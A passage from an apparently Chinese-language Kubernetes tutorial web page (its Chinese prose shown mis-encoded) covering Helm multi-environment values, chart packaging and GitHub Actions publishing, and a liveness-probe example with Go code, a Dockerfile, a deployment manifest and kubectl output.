class="language-bash">[v6] Hello, Helm! Message from helm values: It works with Helm Values!, From namespace: default, From host: hellok8s-deployment-57d7df7964-482xw, Get Database Connect URL: http://DB_ADDRESS_DEFAULT, Database Connect Password: db_password</span><br></code></pre></td></tr></table></figure><h3 id="å¤šç¯å¢ƒé…ç½®"><a href="#å¤šç¯å¢ƒé…ç½®" class="headerlink" title="å¤šç¯å¢ƒé…ç½®"></a>å¤šç¯å¢ƒé…ç½®</h3><p>ä½¿ç”¨ Helm ä¹Ÿå¾ˆå®¹æ˜“å¤šç¯å¢ƒéƒ¨ç½²ï¼Œæ–°å»º <code>values-dev.yaml</code> æ–‡ä»¶ï¼Œé‡Œé¢å†…å®¹è‡ªå®šä¹‰ <code>dev</code> ç¯å¢ƒéœ€è¦çš„é…ç½®ä¿¡æ¯ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">application:</span><br>  <span class="hljs-attr">hellok8s:</span><br>    <span class="hljs-attr">message:</span> <span class="hljs-string">&quot;It works with Helm Values values-dev.yaml!&quot;</span><br>    <span class="hljs-attr">database:</span><br>      <span class="hljs-attr">url:</span> <span class="hljs-string">&quot;http://DB_ADDRESS_DEV&quot;</span><br>      <span class="hljs-attr">password:</span> <span class="hljs-string">&quot;db_password_dev&quot;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥å¤šæ¬¡æŒ‡å®šâ€™â€“values -fâ€™å‚æ•°ï¼Œæœ€åï¼ˆæœ€å³è¾¹ï¼‰æŒ‡å®šçš„æ–‡ä»¶ä¼˜å…ˆçº§æœ€é«˜ï¼Œè¿™é‡Œæœ€å³è¾¹çš„æ˜¯ <code>values-dev.yaml</code> æ–‡ä»¶ï¼Œæ‰€ä»¥ <code>values-dev.yaml</code> æ–‡ä»¶ä¸­çš„å€¼ä¼šè¦†ç›– <code>values.yaml</code> ä¸­ç›¸åŒçš„å€¼ï¼Œ<code>-n dev</code> è¡¨ç¤ºåœ¨åå­—ä¸º dev çš„ namespace ä¸­åˆ›å»º k8s èµ„æºï¼Œæ‰§è¡Œå®Œæˆåï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>curl</code> å‘½ä»¤çœ‹åˆ°è¿”å›çš„å­—ç¬¦ä¸²ä¸­è¯»å–çš„æ˜¯ <code>values-dev.yaml</code> æ–‡ä»¶çš„é…ç½®ï¼Œå¹¶ä¸” <code>From namespace = dev</code>ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">helm upgrade --install hello-helm -f values.yaml -f values-dev.yaml -n dev .<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Release <span class="hljs-string">&quot;hello-helm&quot;</span> does not exist. Installing it now.</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME: hello-helm</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAMESPACE: dev</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">STATUS: deployed</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">REVISION: 1</span><br><br>curl http://192.168.59.100/hello<br><span class="hljs-meta prompt_"># </span><span class="language-bash">[v6] Hello, Helm! Message from helm values: It works with Helm Values values-dev.yaml!, From namespace: dev, From host: hellok8s-deployment-f5fff9df-89sn6, Get Database Connect URL: http://DB_ADDRESS_DEV, Database Connect Password: db_password_dev</span><br><br>kubectl get pods -n dev<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                                 READY   STATUS    RESTARTS   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-f5fff9df-89sn6   1/1     Running   0          4m23s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-f5fff9df-tkh6g   1/1     Running   0          4m23s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-f5fff9df-wmlpb   1/1     Running   0          4m23s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">nginx-deployment-d47fd7f66-cdlmf     1/1     Running   0          4m23s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">nginx-deployment-d47fd7f66-cgst2     1/1     Running   0          4m23s</span><br></code></pre></td></tr></table></figure><p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ â€˜â€“set-fileâ€™ è®¾ç½®ç‹¬ç«‹çš„å€¼ï¼Œç±»ä¼¼äº <code>helm upgrade --install hello-helm -f values.yaml -f values-dev.yaml --set application.hellok8s.message=&quot;It works with set helm values&quot; -n dev .</code> æ–¹å¼åœ¨å‘½ä»¤ä¸­è®¾ç½® values çš„å€¼ï¼Œå¯ä»¥éšæ„ä¿®æ”¹ç›¸å…³é…ç½®ï¼Œæ­¤æ–¹æ³•åœ¨ CICD ä¸­ç»å¸¸ç”¨åˆ°ã€‚</p><h2 id="helm-chart-æ‰“åŒ…å’Œå‘å¸ƒ"><a href="#helm-chart-æ‰“åŒ…å’Œå‘å¸ƒ" class="headerlink" title="helm chart æ‰“åŒ…å’Œå‘å¸ƒ"></a>helm chart æ‰“åŒ…å’Œå‘å¸ƒ</h2><p>ä¸Šé¢çš„ä¾‹å­å±•ç¤ºäº†æˆ‘ä»¬å¯ä»¥ç”¨ä¸€è¡Œå‘½ä»¤åœ¨ä¸€ä¸ªæ–°çš„ç¯å¢ƒä¸­å®‰è£…æ‰€æœ‰éœ€è¦çš„ k8s èµ„æºï¼é‚£ä¹ˆå¦‚ä½•å°† helm chart æ‰“åŒ…ã€åˆ†å‘å’Œä¸‹è½½å‘¢ï¼Ÿåœ¨å®˜ç½‘ä¸­ï¼Œæä¾›äº†ä¸¤ç§æ•™ç¨‹ï¼Œä¸€ç§æ˜¯ä»¥ <a href="https://helm.sh/zh/docs/howto/chart_repository_sync_example/">GCS å­˜å‚¨çš„æ•™ç¨‹</a>ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯ä»¥ <a href="https://helm.sh/zh/docs/howto/chart_releaser_action/">GitHub Pages å­˜å‚¨çš„æ•™ç¨‹</a>ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ç¬¬äºŒç§ï¼Œå¹¶ä¸”ä½¿ç”¨ <a href="https://github.com/helm/chart-releaser-action">chart-releaser-action</a> æ¥åšè‡ªåŠ¨å‘å¸ƒï¼Œè¯¥ action ä¼šé»˜è®¤ç”Ÿæˆ helm chart å‘å¸ƒåˆ° <code>gh-pages</code> åˆ†æ”¯ä¸Šï¼Œæœ¬æ•™ç¨‹çš„ hellok8s helm chart å°±å‘å¸ƒåœ¨äº†æœ¬ä»“åº“çš„<a href="https://github.com/guangzhengli/k8s-tutorials/tree/gh-pages/">gh-pages</a> åˆ†æ”¯ä¸Šçš„ <code>index.yaml</code> æ–‡ä»¶ä¸­ã€‚</p><p>åœ¨ä½¿ç”¨ action è‡ªåŠ¨ç”Ÿæˆ chart ä¹‹å‰ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆç†Ÿæ‚‰ä¸€ä¸‹å¦‚ä½•æ‰‹åŠ¨ç”Ÿæˆï¼Œåœ¨ <code>hello-helm</code> ç›®å½•ä¸‹ï¼Œæ‰§è¡Œ <code>helm package</code> å°†chartç›®å½•æ‰“åŒ…åˆ°chartå½’æ¡£ä¸­ã€‚<code>helm repo index</code> å‘½ä»¤å¯ä»¥åŸºäºåŒ…å«æ‰“åŒ…chartçš„ç›®å½•ï¼Œç”Ÿæˆä»“åº“çš„ç´¢å¼•æ–‡ä»¶ <code>index.yaml</code>ã€‚</p><p>æœ€åï¼Œå¯ä»¥ä½¿ç”¨ <code>helm upgrade --install *.tgz</code> å‘½ä»¤å°†è¯¥æŒ‡å®šåŒ…è¿›è¡Œå®‰è£…ä½¿ç”¨ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">helm package hello-helm<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Successfully packaged chart and saved it to: /Users/guangzheng.li/workspace/k8s-tutorials/hello-helm/hello-helm-0.1.0.tgz</span><br><br>helm repo index .<br><br>helm upgrade --install hello-helm hello-helm-0.1.0.tgz<br></code></pre></td></tr></table></figure><p>åŸºäºä¸Šé¢çš„æ­¥éª¤ï¼Œä½ å¯èƒ½å·²ç»æƒ³åˆ°ï¼Œæ‰€è°“çš„ helm æ‰“åŒ…å’Œå‘å¸ƒï¼Œå°±æ˜¯ <code>hello-helm-0.1.0.tgz</code> æ–‡ä»¶å’Œ <code>index.yaml</code> ç”Ÿæˆå’Œä¸Šä¼ çš„ä¸€ä¸ªè¿‡ç¨‹ã€‚è€Œ helm ä¸‹è½½å’Œå®‰è£…ï¼Œå°±æ˜¯å¦‚ä½•å°† <code>.tgz</code> å’Œ <code>index.yaml</code> æ–‡ä»¶ä¸‹è½½å’Œ <code>helm upgrade --install</code> çš„è¿‡ç¨‹ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å‘å¸ƒç”Ÿæˆçš„ hellok8s helm chartï¼Œå…ˆå°†æ‰‹åŠ¨ç”Ÿæˆçš„ <code>hello-helm-0.1.0.tgz</code> å’Œ <code>index.yaml</code> æ–‡ä»¶åˆ é™¤ï¼Œåç»­ä½¿ç”¨ GitHub action è‡ªåŠ¨ç”Ÿæˆå’Œå‘å¸ƒè¿™ä¸¤ä¸ªæ–‡ä»¶ã€‚</p><p>GitHub action çš„ä»£ç å¯ä»¥å‚è€ƒ <a href="https://helm.sh/zh/docs/howto/chart_releaser_action/">å®˜ç½‘æ–‡æ¡£</a> æˆ–è€…æœ¬ä»“åº“ <code>.github/workflows/release.yml</code> æ–‡ä»¶ã€‚ä»£è¡¨å½“ push ä»£ç åˆ°è¿œç¨‹ä»“åº“æ—¶ï¼Œå°† <code>helm-charts</code> ç›®å½•ä¸‹çš„æ‰€æœ‰ charts è‡ªåŠ¨æ‰“åŒ…å’Œå‘å¸ƒåˆ° <code>gh-pages</code> åˆ†æ”¯å»(éœ€è¦ä¿è¯ <code>gh-pages</code> åˆ†æ”¯å·²ç»å­˜åœ¨ï¼Œå¦åˆ™ä¼šæŠ¥é”™)ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">Release</span> <span class="hljs-string">Charts</span><br><br><span class="hljs-attr">on:</span><br>  <span class="hljs-attr">push:</span><br>    <span class="hljs-attr">branches:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">main</span><br><br><span class="hljs-attr">jobs:</span><br>  <span class="hljs-attr">release:</span><br>    <span class="hljs-comment"># depending on default permission settings for your org (contents being read-only or read-write for workloads), you will have to add permissions</span><br>    <span class="hljs-comment"># see: https://docs.github.com/en/actions/security-guides/automatic-token-authentication#modifying-the-permissions-for-the-github_token</span><br>    <span class="hljs-attr">permissions:</span><br>      <span class="hljs-attr">contents:</span> <span class="hljs-string">write</span><br>    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span><br>    <span class="hljs-attr">steps:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Checkout</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v2</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">fetch-depth:</span> <span class="hljs-number">0</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Configure</span> <span class="hljs-string">Git</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          git config user.name &quot;$GITHUB_ACTOR&quot;</span><br><span class="hljs-string">          git config user.email &quot;$GITHUB_ACTOR@users.noreply.github.com&quot;</span><br><span class="hljs-string"></span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">Helm</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">azure/setup-helm@v1</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">version:</span> <span class="hljs-string">v3.8.1</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Run</span> <span class="hljs-string">chart-releaser</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">helm/chart-releaser-action@v1.4.0</span><br>        <span class="hljs-attr">with:</span> <br>          <span class="hljs-attr">charts_dir:</span> <span class="hljs-string">helm-charts</span><br>        <span class="hljs-attr">env:</span><br>          <span class="hljs-attr">CR_TOKEN:</span> <span class="hljs-string">&quot;$<span class="hljs-template-variable">&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure><p>æ¥ç€é…ç½®ä»“åº“çš„ <code>Settings -&gt; Pages -&gt; Build and deployment -&gt; Branch</code>ï¼Œé€‰æ‹© <code>gh-pages</code> åˆ†æ”¯ï¼ŒGitHub ä¼šè‡ªåŠ¨åœ¨ <code>https://username.github.io/project</code> å‘å¸ƒ helm chartã€‚</p><h1 id="æ¢é’ˆ"><a href="#æ¢é’ˆ" class="headerlink" title="æ¢é’ˆ"></a>æ¢é’ˆ</h1><h2 id="å­˜æ´»æ¢é’ˆ-livenessProb"><a href="#å­˜æ´»æ¢é’ˆ-livenessProb" class="headerlink" title="å­˜æ´»æ¢é’ˆ (livenessProb)"></a>å­˜æ´»æ¢é’ˆ (livenessProb)</h2><blockquote><p>å­˜æ´»æ¢æµ‹å™¨æ¥ç¡®å®šä»€ä¹ˆæ—¶å€™è¦é‡å¯å®¹å™¨ã€‚ ä¾‹å¦‚ï¼Œå­˜æ´»æ¢æµ‹å™¨å¯ä»¥æ¢æµ‹åˆ°åº”ç”¨æ­»é”ï¼ˆåº”ç”¨ç¨‹åºåœ¨è¿è¡Œï¼Œä½†æ˜¯æ— æ³•ç»§ç»­æ‰§è¡Œåé¢çš„æ­¥éª¤ï¼‰æƒ…å†µã€‚ é‡å¯è¿™ç§çŠ¶æ€ä¸‹çš„å®¹å™¨æœ‰åŠ©äºæé«˜åº”ç”¨çš„å¯ç”¨æ€§ï¼Œå³ä½¿å…¶ä¸­å­˜åœ¨ç¼ºé™·ã€‚â€“ <a href="https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/">LivenessProb</a></p></blockquote><p>åœ¨ç”Ÿäº§ä¸­ï¼Œæœ‰æ—¶å€™å› ä¸ºæŸäº› bug å¯¼è‡´åº”ç”¨æ­»é”æˆ–è€…çº¿ç¨‹è€—å°½äº†ï¼Œæœ€ç»ˆä¼šå¯¼è‡´åº”ç”¨æ— æ³•ç»§ç»­æä¾›æœåŠ¡ï¼Œè¿™ä¸ªæ—¶å€™å¦‚æœæ²¡æœ‰æ‰‹æ®µæ¥è‡ªåŠ¨ç›‘æ§å’Œå¤„ç†è¿™ä¸€é—®é¢˜çš„è¯ï¼Œå¯èƒ½ä¼šå¯¼è‡´å¾ˆé•¿ä¸€æ®µæ—¶é—´æ— äººå‘ç°ã€‚<a href="https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/">kubelet</a> ä½¿ç”¨å­˜æ´»æ¢æµ‹å™¨ (livenessProb) æ¥ç¡®å®šä»€ä¹ˆæ—¶å€™è¦é‡å¯å®¹å™¨ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å†™ä¸€ä¸ª <code>/healthz</code> æ¥å£æ¥è¯´æ˜ <code>livenessProb</code> å¦‚ä½•ä½¿ç”¨ã€‚ <code>/healthz</code> æ¥å£ä¼šåœ¨å¯åŠ¨æˆåŠŸçš„ 15s å†…æ­£å¸¸è¿”å› 200 çŠ¶æ€ç ï¼Œåœ¨ 15s åï¼Œä¼šä¸€ç›´è¿”å› 500 çš„çŠ¶æ€ç ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hello</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>io.WriteString(w, <span class="hljs-string">&quot;[v2] Hello, Kubernetes!&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>started := time.Now()<br>http.HandleFunc(<span class="hljs-string">&quot;/healthz&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>duration := time.Since(started)<br><span class="hljs-keyword">if</span> duration.Seconds() &gt; <span class="hljs-number">15</span> &#123;<br>w.WriteHeader(<span class="hljs-number">500</span>)<br>w.Write([]<span class="hljs-type">byte</span>(fmt.Sprintf(<span class="hljs-string">&quot;error: %v&quot;</span>, duration.Seconds())))<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>w.WriteHeader(<span class="hljs-number">200</span>)<br>w.Write([]<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;ok&quot;</span>))<br>&#125;<br>&#125;)<br><br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, hello)<br>http.ListenAndServe(<span class="hljs-string">&quot;:3000&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¼–å†™å¯¹åº”çš„ <code>Dockerfile</code> æ–‡ä»¶ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Dockerfile</span><br><span class="hljs-string">FROM</span> <span class="hljs-string">golang:1.16-buster</span> <span class="hljs-string">AS</span> <span class="hljs-string">builder</span><br><span class="hljs-string">RUN</span> <span class="hljs-string">mkdir</span> <span class="hljs-string">/src</span><br><span class="hljs-string">ADD</span> <span class="hljs-string">.</span> <span class="hljs-string">/src</span><br><span class="hljs-string">WORKDIR</span> <span class="hljs-string">/src</span><br><br><span class="hljs-string">RUN</span> <span class="hljs-string">go</span> <span class="hljs-string">env</span> <span class="hljs-string">-w</span> <span class="hljs-string">GO111MODULE=auto</span><br><span class="hljs-string">RUN</span> <span class="hljs-string">go</span> <span class="hljs-string">build</span> <span class="hljs-string">-o</span> <span class="hljs-string">main</span> <span class="hljs-string">.</span><br><br><span class="hljs-string">FROM</span> <span class="hljs-string">gcr.io/distroless/base-debian10</span><br><br><span class="hljs-string">WORKDIR</span> <span class="hljs-string">/</span><br><br><span class="hljs-string">COPY</span> <span class="hljs-string">--from=builder</span> <span class="hljs-string">/src/main</span> <span class="hljs-string">/main</span><br><span class="hljs-string">EXPOSE</span> <span class="hljs-number">3000</span><br><span class="hljs-string">ENTRYPOINT</span> [<span class="hljs-string">&quot;/main&quot;</span>]<br></code></pre></td></tr></table></figure><p><code>Dockerfile</code> çš„ç¼–å†™å’ŒåŸæ¥ä¿æŒä¸€è‡´ï¼Œæˆ‘ä»¬æŠŠ <code>tag</code> ä¿®æ”¹ä¸º <code>liveness</code> å¹¶æ¨é€åˆ°è¿œç¨‹ä»“åº“ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker build . -t guangzhengli/hellok8s:liveness<br>docker push guangzhengli/hellok8s:liveness<br></code></pre></td></tr></table></figure><p>æœ€åç¼–å†™ deployment çš„å®šä¹‰ï¼Œè¿™é‡Œä½¿ç”¨å­˜æ´»æ¢æµ‹æ–¹å¼æ˜¯ä½¿ç”¨ HTTP GET è¯·æ±‚ï¼Œè¯·æ±‚çš„æ˜¯åˆšæ‰å®šä¹‰çš„ <code>/healthz</code> æ¥å£ï¼Œ<code>periodSeconds</code> å­—æ®µæŒ‡å®šäº† kubelet æ¯éš” 3 ç§’æ‰§è¡Œä¸€æ¬¡å­˜æ´»æ¢æµ‹ã€‚ <code>initialDelaySeconds</code> å­—æ®µå‘Šè¯‰ kubelet åœ¨æ‰§è¡Œç¬¬ä¸€æ¬¡æ¢æµ‹å‰åº”è¯¥ç­‰å¾… 3 ç§’ã€‚å¦‚æœæœåŠ¡å™¨ä¸Š <code>/healthz</code> è·¯å¾„ä¸‹çš„å¤„ç†ç¨‹åºè¿”å›æˆåŠŸä»£ç ï¼Œåˆ™ kubelet è®¤ä¸ºå®¹å™¨æ˜¯å¥åº·å­˜æ´»çš„ã€‚ å¦‚æœå¤„ç†ç¨‹åºè¿”å›å¤±è´¥ä»£ç ï¼Œåˆ™ kubelet ä¼šæ€æ­»è¿™ä¸ªå®¹å™¨å¹¶å°†å…¶é‡å¯ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-deployment</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">strategy:</span><br>     <span class="hljs-attr">rollingUpdate:</span><br>      <span class="hljs-attr">maxSurge:</span> <span class="hljs-number">1</span><br>      <span class="hljs-attr">maxUnavailable:</span> <span class="hljs-number">1</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">guangzhengli/hellok8s:liveness</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-container</span><br>          <span class="hljs-attr">livenessProbe:</span><br>            <span class="hljs-attr">httpGet:</span><br>              <span class="hljs-attr">path:</span> <span class="hljs-string">/healthz</span><br>              <span class="hljs-attr">port:</span> <span class="hljs-number">3000</span><br>            <span class="hljs-attr">initialDelaySeconds:</span> <span class="hljs-number">3</span><br>            <span class="hljs-attr">periodSeconds:</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡ <code>get</code> æˆ–è€… <code>describe</code> å‘½ä»¤å¯ä»¥å‘ç° pod ä¸€ç›´å¤„äºé‡å¯å½“ä¸­ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl apply -f deployment.yaml<br><br>kubectl get pods<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                                   READY   STATUS    RESTARTS     AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-5995ff9447-d5fbz   1/1     Running   4 (6s ago)   102s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-5995ff9447-gz2cx   1/1     Running   4 (5s ago)   101s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-5995ff9447-rh29x   1/1     Running   4 (6s ago)   102s</span><br><br>kubectl describe pod hellok8s-68f47f657c-zwn6g<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">...</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">...</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">...</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Events:</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"> Type     Reason     Age                   From               Message</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"> ----     ------     ----                  ----               -------</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"> Normal   Scheduled  12m                   default-scheduler  Successfully assigned default/hellok8s-deployment-5995ff9447-rh29x to minikube</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"> Normal   Pulled     11m (x4 over 12m)     kubelet            Container image <span class="hljs-string">&quot;guangzhengli/hellok8s:liveness&quot;</span> already present on machine</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"> Normal   Created    11m (x4 over 12m)     kubelet            Created container hellok8s-container</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"> Normal   Started    11m (x4 over 12m)     kubelet            Started container hellok8s-container</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"> Normal   Killing    11m (x3 over 12m)     kubelet            Container hellok8s-container failed liveness probe, will be restarted</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"> Warning  Unhealthy  11m (x10 over 12m)    kubelet            Liveness probe failed: HTTP probe failed with statuscode: 500</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"> Warning  BackOff    2m41s (x36 over 10m)  kubelet            Back-off restarting failed container</span><br></code></pre></td></tr></table></figure><h2 id="å°±ç»ªæ¢é’ˆ-readiness"><a href="#å°±ç»ªæ¢é’ˆ-readiness" class="headerlink" title="å°±ç»ªæ¢é’ˆ (readiness)"></a>å°±ç»ªæ¢é’ˆ (readiness)</h2><blockquote><p>å°±ç»ªæ¢æµ‹å™¨å¯ä»¥çŸ¥é“å®¹å™¨ä½•æ—¶å‡†å¤‡å¥½æ¥å—è¯·æ±‚æµé‡ï¼Œå½“ä¸€ä¸ª Pod å†…çš„æ‰€æœ‰å®¹å™¨éƒ½å°±ç»ªæ—¶ï¼Œæ‰èƒ½è®¤ä¸ºè¯¥ Pod å°±ç»ªã€‚ è¿™ç§ä¿¡å·çš„ä¸€ä¸ªç”¨é€”å°±æ˜¯æ§åˆ¶å“ªä¸ª Pod ä½œä¸º Service çš„åç«¯ã€‚ è‹¥ Pod 